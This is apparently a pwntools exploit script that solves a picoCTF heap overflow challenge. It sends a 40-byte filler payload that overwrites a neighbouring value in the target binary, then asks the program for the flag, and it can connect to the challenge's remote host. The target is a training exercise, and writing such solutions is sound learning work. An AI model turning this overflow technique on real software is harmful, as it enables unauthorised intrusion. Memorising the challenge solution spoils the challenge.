#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("tethys.picoctf.net", 58548)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter your choice: ", b"2")

payload = b"A"*40 # 5 quadwords should be 8*5 = 40 bytes from user data to "bico"

io.sendlineafter(b"Data for buffer: ", payload)

# Print flag
io.sendlineafter(b"Enter your choice: ", b"4")

io.interactive()
